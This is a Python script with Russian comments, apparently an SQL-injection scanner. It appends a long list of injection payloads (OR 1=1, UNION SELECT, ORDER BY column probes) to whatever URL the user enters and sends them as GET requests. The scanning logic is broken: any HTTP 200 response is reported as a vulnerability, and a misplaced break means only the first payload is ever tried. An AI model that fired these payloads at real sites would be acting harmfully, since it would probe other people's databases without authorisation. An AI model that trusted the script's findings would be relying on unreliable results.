import requests
import sys
import time




def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10. / 100)


try:


    def scan(url):
       #полезные нагрузки SQL-инъекций.
        payloads = ["' OR 1=1; --",
                    "' OR '1'='1",
                    "' or",
                    "-- or",
                    "' OR '1",
                    "' OR 1 - - -",
                    " OR ""= ",
                    " OR 1 = 1 - - -",
                    "' OR '' = '",
                    "1' ORDER BY 1--+",
                    "1' ORDER BY 2--+",
                    "1' ORDER BY 3--+",

                    "1' ORDER BY 1, 2--+",
                    "1' ORDER BY 1, 2, 3--+",

                    "1' GROUP BY 1, 2, --+",
                    "1' GROUP BY 1, 2, 3--+",
                    "' GROUP BY columnnames having 1= 1 - -",
                    "-1' UNION SELECT 1, 2, 3--+",
                    "OR 1 = 1",
                    "OR 1 = 0",
                    "OR 1= 1#",
                    "OR 1 = 0#",
                    "OR 1 = 1--",
                    "OR 1= 0--",
                    "HAVING 1 = 1",
                    "HAVING 1= 0",
                    "HAVING 1= 1#",
                    "HAVING 1= 0#",
                    "HAVING 1 = 1--",
                    "HAVING 1 = 0--",
                    "AND 1= 1",
                    "AND 1= 0",
                    "AND 1 = 1--",
                    "AND 1 = 0--",
                    "AND 1= 1#",
                    "AND 1= 0#",
                    "AND 1 = 1 AND '%' ='",
                    "AND 1 = 0 AND '%' ='",
                    "WHERE 1= 1 AND 1 = 1",
                    "WHERE 1 = 1 AND 1 = 0",
                    "WHERE 1 = 1 AND 1 = 1#",
                    "WHERE 1 = 1 AND 1 = 0#",
                    "WHERE 1 = 1 AND 1 = 1--",
                    "WHERE 1 = 1 AND 1 = 0--",
                    "ORDER BY 1--",
                    "ORDER BY 2--",
                    "ORDER BY 3--",
                    "ORDER BY 4--",
                    "ORDER BY 5--",
                    "ORDER BY 6--",
                    "ORDER BY 7--",
                    "ORDER BY 8--",
                    "ORDER BY 9--",
                    "ORDER BY 10--",
                    "ORDER BY 11--",
                    "ORDER BY 12--",
                    "ORDER BY 13--",
                    "ORDER BY 14--",
                    "ORDER BY 15--",
                    "ORDER BY 16--",
                    "ORDER BY 17--",
                    "ORDER BY 18--",
                    "ORDER BY 19--",
                    "ORDER BY 20--",
                    "ORDER BY 21--",
                    "ORDER BY 22--",
                    "ORDER BY 23--",
                    "ORDER BY 24--",
                    "ORDER BY 25--",
                    "ORDER BY 26--",
                    "ORDER BY 27--",
                    "ORDER BY 28--",
                    "ORDER BY 29--",
                    "ORDER BY 30--",
                    "ORDER BY 31337--",
                    ]

        for payload in payloads:
            r = requests.get(url + payload)
            if r.status_code == 200:
                slowprint(
                    f"\033[91m [+] Уязвимость SQL-инъекции обнаружена в {url}")
            else:
                slowprint("\033[94m [-] Уязвимость не найдена")
            break


    # Протестируйте сканер с уязвимым URL-адресом
    scan(input("\033[92m [*] Введите URL: "))

except KeyboardInterrupt:
    slowprint("\n [-] Ctrl + C Обнаружено...")
    
input("\n\033[93m Enter чтобы выйти")
